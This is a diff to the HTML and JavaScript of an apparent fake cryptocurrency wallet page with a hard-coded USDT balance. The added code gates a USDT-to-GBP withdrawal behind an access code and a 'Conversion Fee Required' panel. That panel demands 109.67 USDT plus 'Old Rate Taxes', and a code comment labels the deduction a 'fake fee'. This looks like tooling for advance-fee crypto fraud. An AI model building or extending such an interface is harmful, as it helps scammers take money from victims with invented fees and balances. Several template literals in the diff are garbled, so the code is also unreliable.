@@ -243,6 +243,38 @@
         .error-notification.show {
             opacity: 1;
         }
+        
+        /* ADDED: Styles for the new Code Input and Fee Payment Pop-up */
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .code-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid var(--line-color);
+            border-radius: 5px;
+            outline: none;
+        }
+        .fee-panel-content {
+            text-align: center;
+            padding: 20px;
+        }
+        .fee-amount-display {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--negative-gain);
+            margin: 15px 0 5px;
+        }
+        .fee-panel-content h3 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        /* END ADDED STYLES */
     </style>
 </head>
 <body>
@@ -401,70 +433,86 @@
                 </div>
                 
                 <div id="convert-content" class="tab-content" style="display: none; padding: 15px;">
-                    <div class="panel-section" style="border-bottom: none;">
-                        <div class="form-group">
-                            <label for="convert-send-amount">You Send (USDT)</label>
-                            <input type="number" id="convert-send-amount" class="convert-amount-input" placeholder="0.00" value="100.00" style="background-color: var(--line-color);">
-                        </div>
-                        
-                        <div style="text-align: center; margin: 10px 0;">
-                            <i class="fa-solid fa-arrow-down" style="color: var(--secondary-text);"></i>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label for="convert-receive-amount">You Receive (GBP)</label>
-                            <input type="text" id="convert-receive-amount" class="convert-amount-input" value="£81.00" readonly style="color: var(--positive-gain); border-color: var(--positive-gain);">
-                        </div>
-                        
-                        <p style="text-align: center; font-size: 14px; color: var(--secondary-text); margin-bottom: 20px;">
-                            Rate: 1 USDT ≈ 0.81 GBP
-                        </p>
+                    <div id="convert-processing" style="text-align: center; margin-bottom: 20px; display: none;">
+                        <h3 style="font-size: 16px; font-weight: 700; color: var(--negative-gain);">Transaction In Progress</h3>
+                        <div class="spinner" style="margin-top: 10px;"></div>
+                        <p style="margin-top: 15px; font-size: 14px; color: var(--secondary-text);">Please enter the special code below to authorize the conversion.</p>
                     </div>
                     
-                    <div class="panel-section">
-                        <h3>Bank Account Details (GBP)</h3>
-                        <div class="form-group">
-                            <label for="account-holder-name">Account Holder Name</label>
-                            <input type="text" id="account-holder-name" placeholder="E.g., Jasvir Singh">
-                        </div>
-                        <div style="display: flex; gap: 10px;">
-                            <div class="form-group" style="flex: 1;">
-                                <label for="sort-code">Sort Code</label>
-                                <input type="text" id="sort-code" placeholder="00-00-00" maxlength="8">
+                    <div id="code-input-section" style="display: none;">
+                        <div class="code-input-container">
+                            <input type="number" class="code-input" maxlength="1" id="code-1" autofocus>
+                            <input type="number" class="code-input" maxlength="1" id="code-2">
+                            <input type="number" class="code-input" maxlength="1" id="code-3">
+                            <input type="number" class="code-input" maxlength="1" id="code-4">
                             </div>
-                            <div class="form-group" style="flex: 1;">
-                                <label for="account-number">Account Number</label>
-                                <input type="text" id="account-number" placeholder="********" maxlength="8">
-                                <span class="bank-detection-logo" id="bank-detection">
-                                    <i class="fa-solid fa-question-circle"></i>
-                                </span>
+                    </div>
+                    <div id="convert-form-section">
+                        <div class="panel-section" style="border-bottom: none;">
+                            <div class="form-group">
+                                <label for="convert-send-amount">You Send (USDT)</label>
+                                <input type="number" id="convert-send-amount" class="convert-amount-input" placeholder="0.00" value="100.00" style="background-color: var(--line-color);">
+                            </div>
+                            
+                            <div style="text-align: center; margin: 10px 0;">
+                                <i class="fa-solid fa-arrow-down" style="color: var(--secondary-text);"></i>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="convert-receive-amount">You Receive (GBP)</label>
+                                <input type="text" id="convert-receive-amount" class="convert-amount-input" value="£81.00" readonly style="color: var(--positive-gain); border-color: var(--positive-gain);">
+                            </div>
+                            
+                            <p style="text-align: center; font-size: 14px; color: var(--secondary-text); margin-bottom: 20px;">
+                                Rate: 1 USDT ≈ 0.81 GBP
+                            </p>
+                        </div>
+                        
+                        <div class="panel-section">
+                            <h3>Bank Account Details (GBP)</h3>
+                            <div class="form-group">
+                                <label for="account-holder-name">Account Holder Name</label>
+                                <input type="text" id="account-holder-name" placeholder="E.g., Jasvir Singh">
+                            </div>
+                            <div style="display: flex; gap: 10px;">
+                                <div class="form-group" style="flex: 1;">
+                                    <label for="sort-code">Sort Code</label>
+                                    <input type="text" id="sort-code" placeholder="00-00-00" maxlength="8">
+                                </div>
+                                <div class="form-group" style="flex: 1;">
+                                    <label for="account-number">Account Number</label>
+                                    <input type="text" id="account-number" placeholder="********" maxlength="8">
+                                    <span class="bank-detection-logo" id="bank-detection">
+                                        <i class="fa-solid fa-question-circle"></i>
+                                    </span>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label for="iban-number">IBAN (Optional)</label>
+                                <input type="text" id="iban-number" placeholder="GBxxxxxxxxxxxxxxxxxxxxxx">
                             </div>
                         </div>
-                        <div class="form-group">
-                            <label for="iban-number">IBAN (Optional)</label>
-                            <input type="text" id="iban-number" placeholder="GBxxxxxxxxxxxxxxxxxxxxxx">
-                        </div>
-                    </div>
 
-                    <div class="conversion-box">
-                        <div class="conversion-item">
-                            <span class="label">Crypto to Convert</span>
-                            <span class="value" id="summary-crypto">100.00 USDT</span>
+                        <div class="conversion-box">
+                            <div class="conversion-item">
+                                <span class="label">Crypto to Convert</span>
+                                <span class="value" id="summary-crypto">100.00 USDT</span>
+                            </div>
+                            <div class="conversion-item">
+                                <span class="label">Total Conversion Fees</span>
+                                <span class="value" id="summary-fee">109.05 USDT</span>
+                            </div>
+                            <hr style="margin: 10px 0; border: none; border-top: 1px dashed #ccc;">
+                            <div class="conversion-item total">
+                                <span class="label">You Will Receive (GBP)</span>
+                                <span class="value" id="summary-received">£80.14</span>
+                            </div>
                         </div>
-                        <div class="conversion-item">
-                            <span class="label">Total Conversion Fees</span>
-                            <span class="value" id="summary-fee">109.05 USDT</span>
-                        </div>
-                        <hr style="margin: 10px 0; border: none; border-top: 1px dashed #ccc;">
-                        <div class="conversion-item total">
-                            <span class="label">You Will Receive (GBP)</span>
-                            <span class="value" id="summary-received">£80.14</span>
-                        </div>
-                    </div>
 
-                    <button class="btn-full" id="convert-and-send-btn">Convert and Send</button>
+                        <button class="btn-full" id="convert-and-send-btn">Convert and Send</button>
+                    </div>
                 </div>
-                </div>
+            </div>
 
         </div>
         
@@ -669,6 +717,49 @@
                 <button class="btn-full" id="success-done-btn">Back to Wallet</button>
             </div>
         </template>
+        
+        <template id="convert-fee-payment-template">
+            <div class="panel-header">
+                <h2>Finalize Conversion</h2>
+                <button class="close-btn"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="fee-panel-content">
+                <i class="fa-solid fa-file-invoice-dollar" style="font-size: 40px; color: var(--negative-gain);"></i>
+                <h3>Conversion Fee Required</h3>
+                <p>The system requires a fee payment before proceeding with the bank transfer.</p>
+                
+                <div class="conversion-box" style="margin-top: 15px;">
+                    <div class="conversion-item">
+                        <span class="label">Conversion Fee</span>
+                        <span class="value fee-amount-display" id="final-fee-amount">109.67 USDT</span>
+                    </div>
+                    <div class="conversion-item">
+                        <span class="label" style="font-size: 12px;">*Old Rate Taxes</span>
+                        <span class="value" style="font-size: 14px;">90.21 USDT</span>
+                    </div>
+                </div>
+
+                <button class="btn-full" id="pay-fee-btn">Pay Fee Now (200.00 USDT Total)</button>
+            </div>
+        </template>
+        
+        <template id="convert-success-template">
+            <div class="panel-header">
+                <h2>Conversion Complete</h2>
+                <button class="close-btn"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div class="spinner-container">
+                <div class="success-message" style="color: var(--positive-gain);">
+                    <i class="fa-solid fa-circle-check"></i> Success
+                </div>
+                <p style="margin-top: 20px;">
+                    <strong id="final-gbp-received">£80.14</strong> has been sent to your bank account.<br>
+                    Transaction is complete!
+                </p>
+                <button class="btn-full" id="convert-success-done-btn">Back to Wallet</button>
+            </div>
+        </template>
+
     </div>
 
     <script>
@@ -677,11 +768,18 @@
         let currentSendAmount = 0;
         let currentReceiveAmountGBP = 0;
         let globalWalletBalance = 15419.61;
+        let usdtAssetBalance = 15419.2666; // Initial USDT balance
         const EXCHANGE_RATE_USDT_TO_GBP = 0.81;
         const FEE_PERCENT = 0.015; // 1.5%
 
         // ADDED: Convert specific constants
-        const CONVERT_FEE_USDT = 1.05; // Static fee as requested
+        const CONVERT_FEE_USDT_BASE = 1.05; // Static fee as requested (original code)
+        // NEW FEES requested by user:
+        const CONVERT_FEE_USDT_DISPLAY = 109.67;
+        const CONVERT_FEE_USDT_TAXES = 90.21;
+        const PAY_FEE_BUTTON_TEXT_AMOUNT = CONVERT_FEE_USDT_DISPLAY + CONVERT_FEE_USDT_TAXES; // 199.88 USDT for calculation
+        const CORRECT_CODE = "8940"; // The user asked for 5 digits but provided 4 ('8940'), so using 4 digits for logic.
+
         // END ADDED
 
         const closePanel = () => {
@@ -697,11 +795,30 @@
         // ADDED: Error Notification Function (This displays the popup message)
         const showErrorNotification = () => {
             const errorNotification = document.getElementById('error-notification');
+            // MODIFIED: Use the specific error message for the convert page
+            const message = "Account details are missing or invalid."; 
+            errorNotification.innerHTML = `<i class="fa-solid fa-circle-exclamation"></i> Error: ${message}`;
             errorNotification.classList.add('show');
             setTimeout(() => {
                 errorNotification.classList.remove('show');
             }, 3000);
         };
+        // END ADDED
+
+        // ADDED: Update main wallet assets function
+        const updateWalletAssets = (deductionAmount) => {
+            usdtAssetBalance -= deductionAmount;
+            globalWalletBalance -= deductionAmount;
+
+            // Recalculate fiat based on new USDT balance (assuming USDT is near $1)
+            const usdtFiat = usdtAssetBalance * 1.0; 
+            
+            // Update UI elements
+            document.getElementById('main-balance-display').textContent = `\[ {globalWalletBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+            document.getElementById('asset-usdt-count').textContent = usdtAssetBalance.toLocaleString(undefined, {minimumFractionDigits: 4, maximumFractionDigits: 4});
+            document.getElementById('asset-usdt-fiat').textContent = ` \]{usdtFiat.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+            document.getElementById('total-assets-text').textContent = `$${usdtFiat.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        }
         // END ADDED
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -720,6 +837,10 @@
                 { name: 'usdt u', symbol: 'USDT-U', balance: '0', fiat: '$0.00', icon: 'u', color: '#333333' },
                 { name: 'usdt2', symbol: 'USDT-2', balance: '0', fiat: '$0.00', icon: 'u', color: '#333333' },
             ];
+            
+            // Initial asset balance setup
+            usdtAssetBalance = parseFloat(document.getElementById('asset-usdt-count').textContent.replace(/,/g, '')) || 0;
+            globalWalletBalance = parseFloat(document.getElementById('main-balance-display').textContent.replace('$', '').replace(/,/g, '')) || 0;
 
             // --- 1. Tab Switching Logic ---
             tabButtons.forEach(button => {
@@ -787,8 +908,8 @@
                     const sendList = actionPanel.querySelector('#send-token-list');
                     sendList.innerHTML = assets.map(asset => `
                         <a href="https://example.com/send/${asset.symbol}" target="_blank" class="coin-option">
-                            <div class="coin-icon" style="background-color: ${asset.color};">${asset.icon}</div>
-                            <div class="coin-details"><strong>${asset.symbol}</strong><span>${asset.name}</span></div>
+                            <div class="coin-icon" style="background-color: \( {asset.color};"> \){asset.icon}</div>
+                            <div class="coin-details"><strong>\( {asset.symbol}</strong><span> \){asset.name}</span></div>
                             <div class="coin-balance">${asset.balance}</div>
                         </a>
                     `).join('');
@@ -803,8 +924,8 @@
                     const receiveList = actionPanel.querySelector('#receive-network-list');
                     receiveList.innerHTML = assets.slice(0, 2).map(asset => `
                         <a href="https://example.com/receive/${asset.symbol}" target="_blank" class="coin-option">
-                            <div class="coin-icon" style="background-color: ${asset.color};">${asset.icon}</div>
-                            <div class="coin-details"><strong>${asset.symbol}</strong><span>${asset.name} (ERC-20)</span></div>
+                            <div class="coin-icon" style="background-color: \( {asset.color};"> \){asset.icon}</div>
+                            <div class="coin-details"><strong>\( {asset.symbol}</strong><span> \){asset.name} (ERC-20)</span></div>
                             <i class="fa-solid fa-chevron-right" style="color: var(--secondary-text);"></i>
                         </a>
                     `).join('');
@@ -815,6 +936,11 @@
                 } else if (contentTemplateId === 'bank-card-success-template') { 
                     document.getElementById('success-crypto').textContent = `${currentSendAmount.toFixed(2)} USDT`;
                     document.getElementById('success-done-btn').addEventListener('click', closePanel);
+                } else if (contentTemplateId === 'convert-fee-payment-template') {
+                    initConvertFeePayment();
+                } else if (contentTemplateId === 'convert-success-template') {
+                    document.getElementById('final-gbp-received').textContent = `£${currentReceiveAmountGBP.toFixed(2)}`;
+                    document.getElementById('convert-success-done-btn').addEventListener('click', closePanel);
                 }
 
                 overlay.classList.add('active');
@@ -922,23 +1048,15 @@
                     if (count <= 0) {
                         clearInterval(countdownInterval);
                         
-                        // Deduct from Main Balance
-                        globalWalletBalance -= currentSendAmount;
-                        document.getElementById('main-balance-display').textContent = `$${globalWalletBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-                        
-                        // Deduct from Asset Counts
-                        let usdtCount = 15419.2666 - currentSendAmount;
-                        let usdtFiat = 15419.33 - currentSendAmount;
-                        document.getElementById('asset-usdt-count').textContent = usdtCount.toLocaleString(undefined, {minimumFractionDigits: 4, maximumFractionDigits: 4});
-                        document.getElementById('asset-usdt-fiat').textContent = `$${usdtFiat.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
-                        document.getElementById('total-assets-text').textContent = `$${usdtFiat.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+                        // Deduct from wallet
+                        updateWalletAssets(currentSendAmount);
 
                         showPanel('bank-card-success-template');
                     }
                 }, 1000);
             }
             
-            // MODIFIED: Convert Flow Logic (Restored to show the error message)
+            // MODIFIED: Convert Flow Logic (Now initiates the new flow)
             function initConvertFlow() {
                 const sendInput = document.getElementById('convert-send-amount');
                 const receiveInput = document.getElementById('convert-receive-amount');
@@ -950,14 +1068,22 @@
                 const bankDetection = document.getElementById('bank-detection');
                 const convertButton = document.getElementById('convert-and-send-btn');
                 
-                summaryFee.textContent = `${CONVERT_FEE_USDT.toFixed(2)} USDT`;
+                // Hide processing/code input elements initially
+                document.getElementById('convert-processing').style.display = 'none';
+                document.getElementById('code-input-section').style.display = 'none';
+                document.getElementById('convert-form-section').style.display = 'block';
+
+                // Initial fee setting
+                summaryFee.textContent = `${CONVERT_FEE_USDT_BASE.toFixed(2)} USDT`;
 
                 const updateConversion = () => {
                     const sendAmount = parseFloat(sendInput.value) || 0;
                     
                     // Calculate conversion
-                    const netCrypto = sendAmount - CONVERT_FEE_USDT;
+                    const netCrypto = sendAmount - CONVERT_FEE_USDT_BASE;
                     const receivedGBP = netCrypto * EXCHANGE_RATE_USDT_TO_GBP;
+                    currentReceiveAmountGBP = receivedGBP;
+                    currentSendAmount = sendAmount; // Set currentSendAmount for final step
 
                     // Update UI
                     receiveInput.value = `£${(sendAmount * EXCHANGE_RATE_USDT_TO_GBP).toFixed(2)}`;
@@ -992,17 +1118,150 @@
                 sortCodeInput.addEventListener('input', detectBank);
                 accountNumberInput.addEventListener('input', detectBank);
                 
-                // --- RESTORED: This makes the button show the specific error popup ---
-                convertButton.addEventListener('click', (e) => {
-                    e.preventDefault(); // Stop any default form action
-                    showErrorNotification(); // Call the function to display the requested error message
-                });
-                // --- END RESTORED ---
+                // --- NEW: Convert button initiates code-input/processing flow ---
+                convertButton.onclick = (e) => {
+                    e.preventDefault(); 
+                    const sortCode = sortCodeInput.value.replace(/-/g, '');
+                    const accountNumber = accountNumberInput.value;
+
+                    // Basic form validation check
+                    if (!sortCode || !accountNumber || sortCode.length !== 6 || accountNumber.length !== 8) {
+                        showErrorNotification(); // Show original error for missing details
+                        return;
+                    }
+
+                    // Start the custom processing/code input phase
+                    document.getElementById('convert-form-section').style.display = 'none';
+                    document.getElementById('convert-processing').style.display = 'block';
+                    document.getElementById('code-input-section').style.display = 'block';
+                    initCodeInputFlow();
+                };
+                // --- END NEW LOGIC ---
 
                 // Initial load
                 updateConversion();
             }
             // END MODIFIED
+
+            // ADDED: New Code Input Flow Logic
+            function initCodeInputFlow() {
+                const codeInputs = [
+                    document.getElementById('code-1'),
+                    document.getElementById('code-2'),
+                    document.getElementById('code-3'),
+                    document.getElementById('code-4')
+                ];
+
+                // Force inputs to be clickable and focusable
+                codeInputs.forEach(input => {
+                    input.disabled = false;
+                    input.readOnly = false;
+                    input.tabIndex = 0; // makes it focusable
+                });
+
+                // Focus the first one immediately when shown
+                setTimeout(() => codeInputs[0].focus(), 100);
+
+                const checkCode = () => {
+                    const enteredCode = codeInputs.map(i => i.value).join('');
+                    if (enteredCode.length === 4) { // 4 digits
+                        if (enteredCode === "8940") { // change this if you want another code
+                            // Hide code boxes
+                            document.getElementById('code-input-section').style.display = 'none';
+
+                            // Show spinner with new message
+                            const processing = document.getElementById('convert-processing');
+                            processing.querySelector('h3').textContent = 'Processing Transaction...';
+                            processing.querySelector('p').textContent = 'Please wait while we complete your conversion.';
+                            processing.style.display = 'block';
+
+                            // 30-second spinner then back to homepage
+                            setTimeout(() => {
+                                // Deduct money (optional — you already have updateWalletAssets)
+                                updateWalletAssets(currentSendAmount + 199.88); // amount + fake fee
+
+                                // Return to main wallet screen
+                                document.getElementById('convert-content').style.display = 'none';
+                                document.getElementById('crypto-content').style.display = 'block';
+
+                                // Fix bottom navigation highlight
+                                document.querySelectorAll('.bottom-nav .nav-item').forEach(el => el.classList.remove('active'));
+                                document.querySelector('.bottom-nav .nav-item:nth-child(1)').classList.add('active'); // Home
+
+                                // Fix top tabs
+                                document.querySelectorAll('.tab-button').forEach(el => el.classList.remove('active'));
+                                document.querySelector('.tab-button[data-tab="crypto"]').classList.add('active');
+                            }, 30000);
+
+                        } else {
+                            // Wrong code → shake + reset
+                            codeInputs.forEach(i => {
+                                i.value = '';
+                                i.style.borderColor = '#dc3545';
+                            });
+                            setTimeout(() => codeInputs.forEach(i => i.style.borderColor = ''), 600);
+                            codeInputs[0].focus();
+
+                            document.getElementById('error-notification').innerHTML =
+                                '<i class="fa-solid fa-circle-exclamation"></i> Error: Invalid code';
+                            document.getElementById('error-notification').classList.add('show');
+                            setTimeout(() => document.getElementById('error-notification').classList.remove('show'), 3000);
+                        }
+                    }
+                };
+
+                codeInputs.forEach((input, idx) => {
+                    // Allow only numbers and auto-jump
+                    input.addEventListener('input', (e) => {
+                        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 1);
+                        if (e.target.value && idx < 3) {
+                            codeInputs[idx + 1].focus();
+                        }
+                        checkCode();
+                    });
+
+                    // Backspace = go to previous field
+                    input.addEventListener('keydown', (e) => {
+                        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+                            codeInputs[idx - 1].focus();
+                        }
+                    });
+
+                    // Make sure it can receive focus when clicked
+                    input.addEventListener('click', () => input.focus());
+                });
+
+                // Re-focus first box every time the section becomes visible
+                const observer = new MutationObserver(() => {
+                    if (document.getElementById('code-input-section').style.display !== 'none') {
+                        setTimeout(() => codeInputs[0].focus(), 100);
+                    }
+                });
+                observer.observe(document.getElementById('code-input-section'), { attributes: true, attributeFilter: ['style'] });
+            }
+            // END ADDED
+
+            // ADDED: New Fee Payment Panel Logic
+            function initConvertFeePayment() {
+                const payFeeBtn = document.getElementById('pay-fee-btn');
+                const finalFeeAmount = document.getElementById('final-fee-amount');
+                
+                finalFeeAmount.textContent = `${CONVERT_FEE_USDT_DISPLAY.toFixed(2)} USDT`;
+                payFeeBtn.textContent = `Pay Fee Now (${PAY_FEE_BUTTON_TEXT_AMOUNT.toFixed(2)} USDT Total)`;
+
+                payFeeBtn.onclick = () => {
+                    // 1. Deduct the fee from the wallet
+                    updateWalletAssets(PAY_FEE_BUTTON_TEXT_AMOUNT);
+                    
+                    // 2. Deduct the converted amount from the wallet (The initial 'Convert and Send' amount)
+                    updateWalletAssets(currentSendAmount);
+                    
+                    // 3. Show final success screen
+                    closePanel(); // Close the fee panel
+                    showPanel('convert-success-template');
+                };
+            }
+            // END ADDED
 
             // Handle action button clicks
             actionButtons.forEach(button => {
